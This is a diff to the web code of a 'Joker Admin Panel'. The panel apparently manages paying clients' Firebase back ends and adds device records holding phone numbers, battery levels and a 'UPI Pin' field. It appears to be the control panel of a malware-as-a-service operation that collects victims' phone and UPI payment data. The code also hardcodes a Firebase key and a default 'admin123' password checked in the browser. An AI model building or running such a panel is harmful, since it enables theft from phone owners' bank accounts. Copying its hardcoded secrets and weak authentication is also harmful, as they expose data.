@@ -150,6 +150,11 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
   border:1px solid rgba(0,255,136,.2);border-radius:10px;
   padding:10px 12px;margin-bottom:10px;
   display:flex;align-items:center;justify-content:space-between;gap:10px;}
+
+/* Add Device Modal */
+.device-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.device-grid .fg{margin-bottom:6px;}
+.device-grid .fg label{font-size:9px;}
 </style>
 </head>
 <body>
@@ -196,6 +201,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
       color:#f59e0b;border:1px solid rgba(245,158,11,.3);">🔑 Change Password</button>
     <button class="btn btn-accent" onclick="openAddClient()"
       style="font-size:12px;padding:7px 14px;border-radius:8px;">+ Client</button>
+    <button class="btn btn-accent" onclick="openAddDevice()"
+      style="font-size:12px;padding:7px 14px;border-radius:8px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);">📱 + Device</button>
     <button class="btn" onclick="showSubAdmins()"
       style="font-size:12px;padding:7px 12px;border-radius:8px;
       background:linear-gradient(135deg,rgba(245,158,11,.2),rgba(245,158,11,.1));
@@ -217,7 +224,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
   </div>
   <div class="stat-box">
     <div class="stat-num" id="s-due" style="color:#ff4466;">0</div>
-    <div class="stat-lbl">Due/Expired</div>
+    <div class="stat-lbl">Due/Exp</div>
   </div>
 </div>
 
@@ -250,6 +257,95 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
   </div>
   <div id="subadmin-list">
     <div style="text-align:center;color:var(--muted);padding:40px;">Loading...</div>
+  </div>
+</div>
+
+<!-- ADD CLIENT MODAL -->
+<div class="overlay" id="modal-add">
+  <div class="modal">
+    <div style="padding:16px 18px;background:linear-gradient(135deg,#00ff88,#00cc6a);
+      border-radius:20px 20px 0 0;font-weight:800;font-size:15px;color:#0a0a0f;">
+      ➕ New Client
+    </div>
+    <div style="padding:16px;">
+      <div class="fg"><label>Client Name *</label>
+        <input id="a-name" placeholder="e.g. Ramesh Sharma"/></div>
+      <div class="fg"><label>Firebase URL *</label>
+        <input id="a-url" placeholder="https://xxx-default-rtdb.firebaseio.com" type="url"/></div>
+      <div class="fg"><label>API Key</label>
+        <input id="a-key" placeholder="AIzaSy..." type="password"/></div>
+      <div class="fg"><label>Project ID</label>
+        <input id="a-pid" placeholder="your-project-id"/></div>
+      <div class="fg"><label>Main Node</label>
+        <input id="a-node" value="csc6"/></div>
+      <div class="fg"><label>Plan</label>
+        <div class="plan-grid">
+          <button class="plan-btn" data-plan="basic" data-price="5000"
+            style="background:rgba(59,130,246,.15);color:#3b82f6;border-color:#3b82f6;"
+            onclick="selectPlan(this)">Basic<br><span style="font-size:11px">₹5,000</span></button>
+          <button class="plan-btn" data-plan="standard" data-price="10000"
+            style="background:rgba(139,92,246,.08);color:#8b5cf6;border-color:#8b5cf6;"
+            onclick="selectPlan(this)">Standard<br><span style="font-size:11px">₹10,000</span></button>
+          <button class="plan-btn" data-plan="premium" data-price="15000"
+            style="background:rgba(245,158,11,.08);color:#f59e0b;border-color:#f59e0b;"
+            onclick="selectPlan(this)">Premium<br><span style="font-size:11px">₹15,000</span></button>
+        </div>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+        <button class="btn btn-gray" onclick="closeModal('modal-add')">Cancel</button>
+        <button class="btn btn-green" onclick="saveClient()">Save Client</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ADD DEVICE MODAL -->
+<div class="overlay" id="modal-add-device">
+  <div class="modal">
+    <div style="padding:16px 18px;background:linear-gradient(135deg,#8b5cf6,#6d28d9);
+      border-radius:20px 20px 0 0;font-weight:800;font-size:15px;color:#fff;">
+      📱 Add New Device
+    </div>
+    <div style="padding:16px;">
+      <div style="background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.2);
+        border-radius:10px;padding:10px 12px;margin-bottom:14px;font-size:12px;color:#8b5cf6;">
+        Device ko <b>direct Firebase</b> mein add karein. Client select karein jisme device add karna hai.
+      </div>
+      
+      <div class="fg"><label>Select Client *</label>
+        <select id="d-client" style="width:100%;background:var(--surface2);border:1.5px solid var(--border);
+          border-radius:10px;padding:11px 13px;font-size:14px;font-family:inherit;outline:none;color:var(--text);">
+          <option value="">-- Select Client --</option>
+        </select>
+      </div>
+      
+      <div class="device-grid">
+        <div class="fg"><label>Device ID *</label>
+          <input id="d-id" placeholder="e.g. dev_001"/></div>
+        <div class="fg"><label>Device Name</label>
+          <input id="d-name" placeholder="e.g. Samsung M32"/></div>
+        <div class="fg"><label>Phone Number</label>
+          <input id="d-phone" placeholder="e.g. 9876543210"/></div>
+        <div class="fg"><label>Battery (%)</label>
+          <input id="d-battery" placeholder="e.g. 85" type="number"/></div>
+        <div class="fg"><label>Status</label>
+          <select id="d-status" style="width:100%;background:var(--surface2);border:1.5px solid var(--border);
+            border-radius:10px;padding:11px 13px;font-size:14px;font-family:inherit;outline:none;color:var(--text);">
+            <option value="online">🟢 Online</option>
+            <option value="offline" selected>🔴 Offline</option>
+          </select>
+        </div>
+        <div class="fg"><label>Date</label>
+          <input id="d-date" placeholder="e.g. 25/06/2026 | 10:14 am"/></div>
+      </div>
+      <div class="fg"><label>UPI Pin</label>
+        <input id="d-upi" placeholder="e.g. 969693|N/A|00|00|0001"/></div>
+      
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:6px;">
+        <button class="btn btn-gray" onclick="closeModal('modal-add-device')">Cancel</button>
+        <button class="btn btn-accent" onclick="saveDevice()" style="background:linear-gradient(135deg,#8b5cf6,#6d28d9);color:#fff;">💾 Add Device</button>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -297,45 +393,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
         <button class="btn btn-gray" onclick="closeModal('modal-sa-pw')">Cancel</button>
         <button class="btn btn-accent" onclick="saveSubAdminPw()">💾 Save</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- ADD CLIENT MODAL -->
-<div class="overlay" id="modal-add">
-  <div class="modal">
-    <div style="padding:16px 18px;background:linear-gradient(135deg,#00ff88,#00cc6a);
-      border-radius:20px 20px 0 0;font-weight:800;font-size:15px;color:#0a0a0f;">
-      ➕ New Client
-    </div>
-    <div style="padding:16px;">
-      <div class="fg"><label>Client Name *</label>
-        <input id="a-name" placeholder="e.g. Ramesh Sharma"/></div>
-      <div class="fg"><label>Firebase URL *</label>
-        <input id="a-url" placeholder="https://xxx-default-rtdb.firebaseio.com" type="url"/></div>
-      <div class="fg"><label>API Key</label>
-        <input id="a-key" placeholder="AIzaSy..." type="password"/></div>
-      <div class="fg"><label>Project ID</label>
-        <input id="a-pid" placeholder="your-project-id"/></div>
-      <div class="fg"><label>Main Node</label>
-        <input id="a-node" value="csc6"/></div>
-      <div class="fg"><label>Plan</label>
-        <div class="plan-grid">
-          <button class="plan-btn" data-plan="basic" data-price="5000"
-            style="background:rgba(59,130,246,.15);color:#3b82f6;border-color:#3b82f6;"
-            onclick="selectPlan(this)">Basic<br><span style="font-size:11px">₹5,000</span></button>
-          <button class="plan-btn" data-plan="standard" data-price="10000"
-            style="background:rgba(139,92,246,.08);color:#8b5cf6;border-color:#8b5cf6;"
-            onclick="selectPlan(this)">Standard<br><span style="font-size:11px">₹10,000</span></button>
-          <button class="plan-btn" data-plan="premium" data-price="15000"
-            style="background:rgba(245,158,11,.08);color:#f59e0b;border-color:#f59e0b;"
-            onclick="selectPlan(this)">Premium<br><span style="font-size:11px">₹15,000</span></button>
-        </div>
-      </div>
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
-        <button class="btn btn-gray" onclick="closeModal('modal-add')">Cancel</button>
-        <button class="btn btn-green" onclick="saveClient()">Save Client</button>
       </div>
     </div>
   </div>
@@ -445,20 +502,19 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
 
 <script>
 /* ============================================================
-   Joker Admin Panel - FIXED BASE_URL
+   Joker Admin Panel - Complete
    Default password: admin123
    ============================================================ */
 
 var SESSION_KEY = 'joker_admin_auth';
-
-/* --- FIXED: BASE_URL for GitHub Pages --- */
 var BASE_URL = 'https://y5667.github.io/Csc1/';
+var clients = [];
+var subAdmins = [];
 
-/* --- Load saved password from localStorage --- */
+/* --- LOAD SAVED PASSWORD --- */
 function getAdminPassword(){
   var saved = localStorage.getItem('joker_admin_password');
-  if(saved) return saved;
-  return 'admin123';
+  return saved || 'admin123';
 }
 
 function setAdminPassword(newPass){
@@ -542,14 +598,6 @@ function saveNewAdminPw(){
 var ADMIN_FB_URL = 'https://joker-monitor-default-rtdb.firebaseio.com';
 var ADMIN_FB_KEY = 'AIzaSyCwcXVB4KQQ4VVB9KXB0BAQVBVgkJVQhAAVwGDkBEVldNFQpWCFIPUhFZHQ1RX18';
 var ADMIN_AUTH = '?auth=' + encodeURIComponent(ADMIN_FB_KEY);
-
-var clients = [];
-var subAdmins = [];
-var curTab = 'all';
-var curPayClient = null;
-var curPlan = 'basic';
-var curMonths = 1;
-var curSaId = null;
 
 function fbSaveAll(){
   fetch(ADMIN_FB_URL + '/joker_super.json' + ADMIN_AUTH, {
@@ -923,6 +971,82 @@ function saveClient(){
     plan: curPlan, expiry: null, payments: [], createdAt: new Date().toISOString() };
   clients.unshift(c); saveAll(); renderAll(true);
   closeModal('modal-add'); showToast('✅ Client added: ' + name);
+}
+
+/* --- ADD DEVICE --- */
+function openAddDevice(){
+  // Populate client dropdown
+  var sel = document.getElementById('d-client');
+  sel.innerHTML = '<option value="">-- Select Client --</option>';
+  clients.forEach(function(c){
+    var opt = document.createElement('option');
+    opt.value = c.id;
+    opt.textContent = c.name + ' (' + c.node + ')';
+    sel.appendChild(opt);
+  });
+  
+  // Clear fields
+  document.getElementById('d-id').value = '';
+  document.getElementById('d-name').value = '';
+  document.getElementById('d-phone').value = '';
+  document.getElementById('d-battery').value = '';
+  document.getElementById('d-status').value = 'offline';
+  document.getElementById('d-date').value = '';
+  document.getElementById('d-upi').value = '';
+  
+  openModal('modal-add-device');
+}
+
+function saveDevice(){
+  var clientId = document.getElementById('d-client').value;
+  var did = document.getElementById('d-id').value.trim();
+  var name = document.getElementById('d-name').value.trim() || did;
+  var phone = document.getElementById('d-phone').value.trim() || 'N/A';
+  var battery = document.getElementById('d-battery').value.trim() || '0';
+  var status = document.getElementById('d-status').value;
+  var date = document.getElementById('d-date').value.trim() || new Date().toLocaleString('en-IN');
+  var upi = document.getElementById('d-upi').value.trim() || 'N/A';
+  
+  if(!clientId){ showToast('Client select karo!'); return; }
+  if(!did){ showToast('Device ID daalo!'); return; }
+  
+  var client = clients.find(function(c){ return c.id === clientId; });
+  if(!client){ showToast('Client not found!'); return; }
+  
+  var auth = client.apiKey ? '?auth=' + encodeURIComponent(client.apiKey) : '';
+  var url = client.fbUrl + '/' + (client.node || 'csc6') + '/All_User/Info/' + did + '.json' + auth;
+  
+  var deviceData = {
+    Name: name,
+    Phone: phone,
+    Battery: battery,
+    status: status,
+    Date: date,
+    UPI: upi,
+    did: did
+  };
+  
+  var btn = document.querySelector('#modal-add-device .btn-accent');
+  btn.disabled = true;
+  btn.textContent = '⏳ Adding...';
+  
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(deviceData)
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(){
+    showToast('✅ Device added: ' + name + ' (' + did + ')');
+    closeModal('modal-add-device');
+    btn.disabled = false;
+    btn.textContent = '💾 Add Device';
+  })
+  .catch(function(e){
+    showToast('❌ Error: ' + e.message);
+    btn.disabled = false;
+    btn.textContent = '💾 Add Device';
+  });
 }
 
 /* --- PAYMENT --- */
